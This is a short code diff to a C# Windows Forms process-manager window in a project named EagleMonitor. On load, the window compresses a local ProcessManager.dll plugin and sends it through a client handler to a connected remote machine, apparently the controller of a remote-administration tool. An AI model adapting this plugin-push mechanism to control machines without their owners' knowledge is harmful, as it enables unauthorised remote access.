@@ -5,6 +5,7 @@ using System.Windows.Forms;
 using PacketLib.Packet;
 using PacketLib;
 using System.IO;
+using EagleMonitor.Utils;
 
 /* 
 || AUTHOR Arsium ||
@@ -26,6 +27,12 @@ namespace EagleMonitor.Forms
         private void ProcessManagerForm_Load(object sender, EventArgs e)
         {
             new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(processDataGridView, guna2VScrollBar1, true);
+            Miscellaneous.Enable(this.processDataGridView);
+
+            ProcessManagerPacket processManagerPacket = new ProcessManagerPacket();
+            processManagerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ProcessManager.dll"), 1);
+
+            this.clientHandler.SendPacket(processManagerPacket);
         }
 
         private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
